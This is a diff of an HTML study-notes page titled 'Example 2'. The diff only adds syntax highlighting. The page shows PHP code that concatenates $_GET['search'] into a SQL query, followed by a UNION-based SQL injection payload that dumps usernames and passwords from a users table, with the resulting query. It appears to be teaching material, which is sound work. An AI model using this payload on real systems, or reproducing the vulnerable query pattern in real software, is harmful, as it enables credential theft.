@@ -591,17 +591,21 @@ min-height: 1em !important;
 }
 </style>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="../../../vendor/highlightjs-11.11.1/github.min.css">
 <link rel="stylesheet" href="../../../site.css">
-</head><body><article class="page sans"><header><div class="page-header-icon undefined"><span class="icon">📎</span></div><h1 class="page-title">Example 2</h1><p class="page-description"></p></header><div class="page-body"><p><mark class="highlight-teal">Example 2</mark></p><pre class="code"><code>&lt;?php
-// connect to DB
-$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
-start_session();
-// search for messages sent to user + the sender of the message
-$query = "SELECT sender, content FROM messages WHERE
-receiver = '" . $_SESSION["user"] . "' AND
-content LIKE '%" . $_GET["search"] . "%'";//show list with sender and message content for all messages sent to user
-...
-?&gt;</code></pre><p></p><p><mark class="highlight-teal">Exploit:</mark>
+</head><body><article class="page sans"><header><div class="page-header-icon undefined"><span class="icon">📎</span></div><h1 class="page-title">Example 2</h1><p class="page-description"></p></header><div class="page-body"><p><mark class="highlight-teal">Example 2</mark></p><pre class="code"><code class="hljs language-php"><span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-comment">// connect to DB</span>
+	<span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(CONNECTION_STRING, DB_USER, DB_PASS);
+	<span class="hljs-title function_ invoke__">start_session</span>();
+&#9;
+	<span class="hljs-comment">// search for messages sent to user + the sender of the message</span>
+	<span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT sender, content FROM messages WHERE
+	receiver = &#x27;&quot;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] . <span class="hljs-string">&quot;&#x27; AND
+	content LIKE &#x27;%&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;search&quot;</span>] . <span class="hljs-string">&quot;%&#x27;&quot;</span>;
+
+	<span class="hljs-comment">//show list with sender and message content for all messages sent to user	</span>
+	...
+<span class="hljs-meta">?&gt;</span></code></pre><p></p><p><mark class="highlight-teal">Exploit:</mark>
 Dumping all the data from the table
 </p><p>
 The two
@@ -610,6 +614,6 @@ subqueries must return the same number of columns else, one must add
 <code>,1</code>
 or something similar to it.
 </p><pre class="code"><code>reciever: attacker
-search: ' UNION SELECT user, password FROM users -- -</code></pre><pre class="code"><code>SELECT sender, content FROM messages WHERE receiver='attacker'
-AND content LIKE '%' UNION SELECT user, password FROM
-users -- - %'</code></pre></div></article></body></html>
+search: ' UNION SELECT user, password FROM users -- -</code></pre><pre class="code"><code class="hljs language-sql"><span class="hljs-keyword">SELECT</span> sender, content <span class="hljs-keyword">FROM</span> messages <span class="hljs-keyword">WHERE</span> receiver<span class="hljs-operator">=</span><span class="hljs-string">&#x27;attacker&#x27;</span>
+<span class="hljs-keyword">AND</span> content <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>, password <span class="hljs-keyword">FROM</span>
+users <span class="hljs-comment">-- - %&#x27;</span></code></pre></div></article></body></html>
